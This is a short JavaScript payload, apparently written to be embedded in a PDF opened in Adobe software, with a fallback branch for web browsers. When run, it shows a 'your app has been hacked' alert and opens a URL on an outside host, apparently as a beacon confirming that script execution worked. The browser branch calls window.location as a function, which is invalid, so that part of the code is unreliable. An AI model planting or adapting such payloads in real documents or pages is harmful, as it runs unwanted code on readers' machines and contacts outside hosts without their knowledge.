if (typeof(app) !== "undefined") {
  app.alert("Congratulations, your Adobe App has been hacked!");
  app.launchURL("http://micro.thinx.cloud:5000/images/transparent.png", true);
} else {
  alert("Congratulations, your browser has been hacked.");
  window.location("http://micro.thinx.cloud:5000/images/transparent.png", true);
}
